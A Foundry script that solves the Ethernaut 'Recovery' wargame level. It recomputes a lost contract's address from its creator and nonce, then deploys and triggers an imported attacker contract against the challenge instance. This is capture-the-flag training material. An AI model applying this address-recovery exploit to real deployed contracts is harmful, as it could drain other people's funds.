// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
import "../../src/17-RecoveryAttacker.sol";

contract RecoverySolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0xAF98ab8F2e2B24F42C661ed023237f5B7acAB048;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        // NOTE Must send at least 0.001 ETH
        address challengeInstance = __createInstance(LEVEL_ADDRESS);

        // YOUR SOLUTION HERE
        address newAddress = address(uint160(uint256(keccak256(abi.encodePacked(
            bytes1(0xd6),
            bytes1(0x94),
            challengeInstance,
            bytes1(0x01)
        )))));
        RecoveryAttacker recoveryAttacker = new RecoveryAttacker(newAddress);
        recoveryAttacker.attack();

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(17));
    }
}
